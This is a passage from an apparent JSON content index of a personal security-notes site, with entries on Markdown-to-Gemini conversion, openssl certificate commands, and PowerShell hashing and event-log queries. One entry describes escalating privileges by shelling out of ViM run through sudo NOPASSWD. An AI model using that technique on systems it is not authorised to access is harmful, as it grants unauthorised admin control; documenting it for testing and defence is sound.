&lt;em&gt;must&lt;/em&gt; use star characters (&lt;code&gt;*&lt;/code&gt;) as their leaders.&lt;/p&gt;\n&lt;h3 id=&quot;quotes&quot;&gt;Quotes&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#quotes&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Quote blocks cannot be nested in Gemini, and all interior formatting is preserved as-is. This means that in practice, quote blocks also can’t contain lists, code blocks, etc.&lt;/p&gt;\n&lt;h3 id=&quot;code-blocks&quot;&gt;“Code” blocks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#code-blocks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Gemini allows code blocks. In Gemini the code block type (normally something like &lt;code&gt;bash&lt;/code&gt; or &lt;code&gt;html&lt;/code&gt; in Markdown) is used by clients as “alt text”. Unfortunately, many Markdown processors (including &lt;a href=&quot;https://jekyllrb.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Jekyll&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;) don’t handle arbitrary strings in the code block type gracefully, so we need to stick with Markdown’s conventions here.&lt;/p&gt;\n&lt;h3 id=&quot;tables&quot;&gt;Tables&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#tables&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;The md2gmn utility handles tables by converting them into code blocks, which works for my purposes.&lt;/p&gt;\n&lt;h2 id=&quot;links-and-images&quot;&gt;Links and images&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#links-and-images&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Gemini doesn’t support Markdown links or images, though tools like md2gmn can handle the conversion into Gemini’s format.&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;=&gt;[&amp;#x3C;whitespace&gt;]&amp;#x3C;URL&gt;[&amp;#x3C;whitespace&gt;&amp;#x3C;USER-FRIENDLY LINK NAME&gt;]\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;I’ve yet to run into a Markdown-to-Gemini converter that handles inline links in a completely sensible way. That said, md2gmn does a good job &lt;em&gt;if and only if&lt;/em&gt; links are presented as unordered lists or on singleton lines. Note that when using this convention, &lt;em&gt;no&lt;/em&gt; non-link characters (except perhaps for the leading &lt;code&gt;* &lt;/code&gt; in unordered lists) may be used. This means that presenting links in unordered lists is probably the best option.&lt;/p&gt;\n&lt;p&gt;As an example, suppose we have the following markdown:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;markdown&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;markdown&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;This is a sentence.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#D4976C&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;necopinus.xyz&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;](&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A3490;--shiki-light-text-decoration:underline;--shiki-dark:#DEDCD590;--shiki-dark-text-decoration:underline&quot;&gt;https://necopinus.xyz&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#D4976C&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Cardboard Iguana Security&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;](&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A3490;--shiki-light-text-decoration:underline;--shiki-dark:#DEDCD590;--shiki-dark-text-decoration:underline&quot;&gt;https://cardboard-iguana.com&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;An image follows.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;![[../02779186c69ce442260bd67d3bd11b3e.webp|This is some image alt-text]]&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Then md2gmn will output:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;gemini&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;gemini&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;This is a sentence.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;=&gt; https://necopinus.xyz necopinus.xyz&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;=&gt; https://cardboard-iguana.com Cardboard Iguana Security&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;An image follows.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;=&gt; ../02779186c69ce442260bd67d3bd11b3e.webp This is some image alt-text&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Incidentally, this gives good guidance as to how to write image alt-text — alt-text should be thought of as the &lt;em&gt;linked text&lt;/em&gt; for the image.&lt;/p&gt;"},"spells/Get-a-shell-from-ViM":{"slug":"spells/Get-a-shell-from-ViM","filePath":"spells/Get a shell from ViM.md","title":"Get a shell from ViM","links":["spells/ViM","spells/sudo"],"tags":["Application/ViM","AttackCycle/PrivEsc","LoLBins"],"content":"If ViM can be run with NOPASSWD via sudo, then commands can be executed as admin using the ! prefix.\nHowever, if a non-standard shell is set in /etc/passwd, Vi and ViM may not be able to shell out with :shell or execute shell commands with !. This is because these apps are attempting to execute $SHELL (in the case of :shell) or $SHELL -c $COMMAND (in the case of !).\nFortunately, Vi and ViM can be set to override the default $SHELL using :set shell=/bin/bash.\n(Exotic shells in /etc/passwd can also cause commands executed via ssh to fail for the same reason.)","richContent":"&lt;p&gt;If &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ViM&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ViM&quot;&gt;ViM&lt;/a&gt; can be &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;run with NOPASSWD via sudo&lt;/a&gt;, then commands can be executed as admin using the &lt;code&gt;!&lt;/code&gt; prefix.&lt;/p&gt;\n&lt;p&gt;However, if a non-standard shell is set in /etc/passwd, &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ViM&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ViM&quot;&gt;Vi&lt;/a&gt; and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ViM&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ViM&quot;&gt;ViM&lt;/a&gt; may not be able to shell out with &lt;code&gt;:shell&lt;/code&gt; or execute shell commands with &lt;code&gt;!&lt;/code&gt;. This is because these apps are attempting to execute &lt;code&gt;$SHELL&lt;/code&gt; (in the case of &lt;code&gt;:shell&lt;/code&gt;) or &lt;code&gt;$SHELL -c $COMMAND&lt;/code&gt; (in the case of &lt;code&gt;!&lt;/code&gt;).&lt;/p&gt;\n&lt;p&gt;Fortunately, &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ViM&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ViM&quot;&gt;Vi&lt;/a&gt; and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ViM&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ViM&quot;&gt;ViM&lt;/a&gt; can be set to override the default &lt;code&gt;$SHELL&lt;/code&gt; using &lt;code&gt;:set shell=/bin/bash&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;(&lt;a href=&quot;https://stackoverflow.com/a/52673010&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Exotic shells in /etc/passwd can also cause commands executed via ssh to fail&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; for the same reason.)&lt;/p&gt;"},"spells/Get-an-SSL-certificate":{"slug":"spells/Get-an-SSL-certificate","filePath":"spells/Get an SSL certificate.md","title":"Get an SSL certificate","links":[],"tags":["Protocol/TLS","HowTo","Application/OpenSSL"],"content":"Self-signed\nopenssl req -x509 -nodes -days 3650 -newkey rsa:4096 \\\n            -out $SITE.crt -keyout $SITE.key\nFrom a real registrar\n\n\n                  \n                  Tip\n                  \n                \n\n\nNow that Let’s Encrypt exists, the below information is a lot less useful…\n\n\n\nGenerate a unique site key:\nopenssl genrsa -out $SITE.key 4096\nGenerate a certificate signing request:\nopenssl req -new -config $SITE.cnf \\\n            -key $SITE.key -out $SITE.csr","richContent":"&lt;h2 id=&quot;self-signed&quot;&gt;Self-signed&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#self-signed&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; req&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -x509&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -nodes&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -days&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 3650&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -newkey&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; rsa:4096&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;            -out&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SITE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.crt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -keyout&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SITE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.key&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;from-a-real-registrar&quot;&gt;From a real registrar&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#from-a-real-registrar&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Now that &lt;a href=&quot;https://letsencrypt.org/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Let’s Encrypt&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; exists, the below information is a lot less useful…&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;Generate a unique site key:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; genrsa&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -out&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SITE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.key&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 4096&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Generate a certificate signing request:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; req&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -new&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SITE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.cnf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;            -key&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SITE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.key&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -out&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SITE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.csr&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Get-FileHash":{"slug":"spells/Get-FileHash","filePath":"spells/Get-FileHash.md","title":"Get-FileHash","links":[],"tags":["Application/PowerShell","Cryptography/Hashes","Cryptography/Hashes/SHA256"],"content":"Get-FileHash -Algorithm $ALGORITHM $FILE_PATH\nThe algorithm can be excluded (in which case SHA-256 is used). Lots of different hashing algorithms are supported — run help Get-FileHash to see a list.","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-FileHash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Algorithm &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ALGORITHM&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;FILE_PATH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The algorithm can be excluded (in which case SHA-256 is used). &lt;em&gt;Lots&lt;/em&gt; of different hashing algorithms are supported — run &lt;code&gt;help Get-FileHash&lt;/code&gt; to see a list.&lt;/p&gt;"},"spells/Get-WinEvent":{"slug":"spells/Get-WinEvent","filePath":"spells/Get-WinEvent.md","title":"Get-WinEvent","links":["spells/Windows-event-logs","spells/Windows-event-IDs"],"tags":["OS/Windows/EventLog","Application/PowerShell","AttackCycle/Reconnaissance"],"content":"Get-WinEvent is a PowerShell command for working with Windows event logs.\n# Get help on Get-WinEvent (calls out to Microsoft).\n#\nGet-Help Get-WinEvent\n \n# Filter event log output using the Where-Object command. This\n# apparently pipes the entire output to the Where-Object\n# command, which then scans for the appropriate field. So a\n# bit inefficient for large logs.\n#\nGet-WinEvent -LogName Application | Where-Object {\n\t$_.ProviderName -Match &#039;WLMS&#039;\n}\n \n# To match event IDs with Where-Object, use the slightly\n# different form `Where-Object Id -eq 100`, etc.\n \n# Use the -FilterHashtable flag. This causes the filtering to\n# be done during the call made by Get-WinEvent, and has a more\n# straight-forward syntax too. However, it only works when\n# called against the system event log; Where-Object needs to\n# be used when specifying an archived log via -Path.\n#\n# Note that hashes can be specified with newlines instead of\n# semicolons as well, which can make scripts A LOT more\n# readable!\n#\nGet-WinEvent -FilterHashtable @{\n\tLogName = &#039;Application&#039;;\n\tProviderName = &#039;WLMS&#039;\n}\n \n# To display all information about an event, pipe the output\n# of Get-WinEvent to `Format-List -Property *`\nFilterHashtable\nThere’s lots of good information about the various FilterHashtable keys in Microsoft’s documentation. Some important ones:\n\nLogName (String)\nProviderName (String)\nPath (String)\nKeywords (Long)\nID (Int32)\nLevel (Int32)\nStartTime (DateTime)\nEndTime (DateTime)\nUserID (SID)\nData (String)\n[NamedData] (String)\n\nWildcards can be used with LogName and ProviderName, but not with other keys.\nEvent Viewer displays most of these values in the “General” when viewing an individual log entry, though note that Keywords is translated to a string.\nKeywords\n\nAuditFailure (4503599627370496)\nAuditSuccess (9007199254740992)\nCorrelationHint2 (18014398509481984)\nEventLogClassic (36028797018963968)\nSqm (2251799813685248)\nWdiDiagnostic (1125899906842624)\nWdiContext (562949953421312)\nResponseTime (281474976710656)\nNone (0)\n\nLevels\n\nVerbose (5)\nInformational (4)\nWarning (3)\nError (2)\nCritical (1)\nLogAlways (0)\n\nEvent IDs\nTransclude of Windows-event-IDs","richContent":"&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/powershell/module/microsoft.powershell.diagnostics/get-winevent&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Get-WinEvent&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is a PowerShell command for working with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-event-logs&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-event-logs&quot;&gt;Windows event logs&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get help on Get-WinEvent (calls out to Microsoft).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-Help&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; Get-WinEvent&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Filter event log output using the Where-Object command. This&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# apparently pipes the entire output to the Where-Object&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# command, which then scans for the appropriate field. So a&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# bit inefficient for large logs.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-WinEvent&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; 